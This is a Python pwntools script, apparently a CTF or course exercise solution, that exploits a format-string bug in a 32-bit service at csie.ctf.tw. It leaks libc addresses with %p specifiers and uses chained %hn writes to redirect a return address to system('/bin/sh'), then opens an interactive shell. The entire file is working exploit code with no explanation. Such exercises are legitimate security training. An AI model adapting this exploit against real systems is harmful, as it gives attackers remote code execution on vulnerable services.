from pwn import *
import time
host = "csie.ctf.tw"
port = 10144
#host = "oasis2.csie.ntu.edu.tw"
#port = 5491

r=remote(host,port)

context.arch = "i386"

def fmt(prev,word,index):
    if prev<word:
        result=word-prev
        fmtstr="%"+str(result)+"c"
    elif prev==word:
        fmtstr=""
    else :
        result=0x10000-prev+word
        fmtstr="%"+str(result)+"c"
    fmtstr+="%"+str(index)+"$hn"
    return fmtstr

r.recvuntil("\n")
r.recvuntil("\n")
r.recvuntil("\n")
r.sendline("!%15$p!"+"\x00")
r.recvuntil("!")
libc_mid=int(r.recvuntil("!")[:-1], 16)
libc_start=libc_mid-0xf7e38637+0xf7e38540
libc=libc_start-0x00018540
system=libc+0x0003a940
#system=libc+0x0005f140 #puts

print(hex(libc))

r.sendline("!%6$p!"+"\x00")
r.recvuntil("!")
to=int(r.recvuntil("!")[:-1], 16)

r.sendline("!%10$p!"+"\x00")
r.recvuntil("!")
old=int(r.recvuntil("!")[:-1], 16)

r.sendline("!%17$p!"+"\x00")
r.recvuntil("!")
old17=int(r.recvuntil("!")[:-1], 16)

print(hex(to))
print(hex(old))
print(hex(old17))


target=(to+4)&0xFFFF
payload=fmt(0,target,6)
r.sendline(payload+"!\x00")
r.recvuntil("!")

target=(system)&0xFFFF
payload=fmt(0,target,10)
r.sendline(payload+"!\x00")
r.recvuntil("!")

target=(to+4+2)&0xFFFF
payload=fmt(0,target,6)
r.sendline(payload+"!\x00")
r.recvuntil("!")

target=(system>>16)&0xFFFF
payload=fmt(0,target,10)
r.sendline(payload+"!\x00")
r.recvuntil("!")


sh=libc+0x00158E8B

target=(to+4*3)&0xFFFF
payload=fmt(0,target,6)
r.sendline(payload+"!\x00")
r.recvuntil("!")

target=(sh)&0xFFFF
payload=fmt(0,target,10)
r.sendline(payload+"!\x00")
r.recvuntil("!")

target=(to+4*3+2)&0xFFFF
payload=fmt(0,target,6)
r.sendline(payload+"!\x00")
r.recvuntil("!")

target=(sh>>16)&0xFFFF
payload=fmt(0,target,10)
r.sendline(payload+"!\x00")
r.recvuntil("!")



target=(old)&0xFFFF
payload=fmt(0,target,6)
r.sendline(payload+"!\x00")
r.recvuntil("!")



r.interactive()

